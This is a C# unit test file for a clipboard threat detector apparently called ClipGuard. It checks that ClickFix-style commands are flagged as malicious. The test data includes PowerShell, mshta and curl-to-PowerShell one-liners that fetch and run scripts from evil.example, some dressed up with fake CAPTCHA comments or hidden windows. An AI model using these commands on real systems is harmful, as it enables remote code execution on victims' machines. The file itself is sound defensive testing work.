using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

public class CommandDetectorTests
{
    // 以下樣本仿照公開報告中的 ClickFix 手法，網址都是無效的 example 網域。
    [Theory]
    [InlineData("powershell -w hidden -c \"iex(iwr 'https://evil.example/a.ps1')\"")]
    [InlineData("powershell.exe -WindowStyle Hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=")]
    [InlineData("mshta https://evil.example/verify.hta # ✅ I am not a robot - reCAPTCHA ID: 2165")]
    [InlineData("cmd /c curl -s https://evil.example/x | powershell                                        # Cloudflare Verification")]
    [InlineData("pwsh -c \"irm https://evil.example | iex\" # 人機驗證 ID: 8812")]
    public void ClickFix樣本判為惡意(string text)
    {
        Assert.Equal(ThreatLevel.Malicious, CommandDetector.Analyze(text).Level);
    }

    [Theory]
    [InlineData("irm get.scoop.sh | iex")]                            // 沒寫程式名稱，但貼進 PowerShell 就會執行 → 提醒（#20）
    [InlineData("powershell -c \"irm https://get.scoop.sh | iex\"")]  // 合法但危險的安裝方式 → 提醒
    [InlineData("curl -fsSL https://bun.sh/install | bash")]
    public void 官方安裝指令不判為惡意(string text)
    {
        Assert.NotEqual(ThreatLevel.Malicious, CommandDetector.Analyze(text).Level);
    }

    [Theory]
    [InlineData("irm get.scoop.sh | iex")]
    [InlineData("powershell -c \"irm https://get.scoop.sh | iex\"")]
    [InlineData("curl -fsSL https://bun.sh/install | bash")]
    public void 下載即執行的安裝指令判為可疑(string text)
    {
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(text).Level);
    }

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("明天下午三點開會")]
    [InlineData("A123456789")]
    [InlineData("https://github.com/powershell/powershell")]  // 網址裡出現 powershell 不該算
    [InlineData("我在學 PowerShell 的 iex 指令")]
    [InlineData("I use powershell every day")]                // #8：英文句子不該算
    [InlineData("I use powershell")]
    [InlineData("Open pwsh and type your name")]
    [InlineData("mshta is a legacy tool")]
    [InlineData("I like powershell - it's great")]
    public void 一般文字判為乾淨(string? text)
    {
        Assert.Equal(ThreatLevel.None, CommandDetector.Analyze(text).Level);
    }

    // #8：程式名稱後面直接接 cmdlet／別名、腳本或管線時仍要抓到。
    [Theory]
    [InlineData("powershell iwr https://evil.example/a | iex")]
    [InlineData("powershell iex(iwr https://evil.example/a)")]
    [InlineData("powershell Invoke-WebRequest https://evil.example/a -OutFile a.exe")]
    [InlineData("powershell Start-Process calc")]
    [InlineData("powershell $u='https://evil.example';iex(irm $u)")]
    [InlineData("powershell .\\setup.ps1")]
    [InlineData("curl -s https://evil.example/x | powershell")]
    [InlineData("pwsh -NoProfile -File a.ps1")]
    [InlineData("mshta https://evil.example/a.hta")]
    [InlineData("mshta vbscript:Execute(\"x\")")]
    public void 真正的呼叫仍判為有執行訊號(string text)
    {
        Assert.NotEqual(ThreatLevel.None, CommandDetector.Analyze(text).Level);
    }

    [Fact]
    public void 結果附上可讀理由()
    {
        var v = CommandDetector.Analyze("powershell -w hidden -c iex(iwr https://evil.example)");
        Assert.Contains("隱藏視窗執行", v.Reasons);
        Assert.Contains("呼叫 PowerShell", v.Reasons);
    }
}
